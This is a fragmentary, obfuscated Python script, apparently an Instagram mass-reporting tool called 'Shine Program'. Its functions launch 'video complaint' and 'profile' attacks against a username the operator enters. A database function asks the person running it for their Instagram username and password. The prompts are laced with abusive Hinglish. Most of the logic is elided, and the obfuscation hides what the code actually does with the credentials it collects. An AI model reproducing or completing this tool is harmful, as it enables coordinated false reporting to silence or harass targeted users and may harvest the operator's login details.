...
def video_attack (OOOOOOO0000OO0OOO ):#line:85
    ...
    print ("")#line:99
    print_status ("Video complaint attack is on! Rukja tatte maje le\n")#line:100
...
def profile_attack (OOO0O00OO0O0O000O ):#line:112
    OO0000OO0O00O0OOO =input ("Enter the username of the person you want to report (BINA @ KE DALIO CHUTIYE WARNA NAHI CHALEGA) : ")#line:113
    ...
    if O0O0O000OOOO0OO00 .status_code !=200 :#line:115
        print ("\n\n"+Fore .RED +"[*] Invalid username! Kardiya chutiya panti nikal ab")#line:116
        time .sleep (2 )#line:117
        profile_attack (OOO0O00OO0O0O000O )#line:118
    elif (OO0000OO0O00O0OOO ==""):#line:119
        print ("\n\n"+Fore .RED +"[*] Enter username again, don't leave it blank, Galti na ho is baar tattu")#line:121
...
def database ():#line:167
    ...
    OOOO0OOOO0O0OOOOO =input ("Enter your instagram username FAST kar: ")#line:173
    O0O0000O0OOOOO000 =input ("Enter your instagram password DHANG ME DAAL : ")#line:174
...
if __name__ =="__main__":#line:283
    try :#line:284
        ...
        print ("\n\n"+Fore .RED +"[*] Program is closing! TQ for Using Shine Program")#line:288
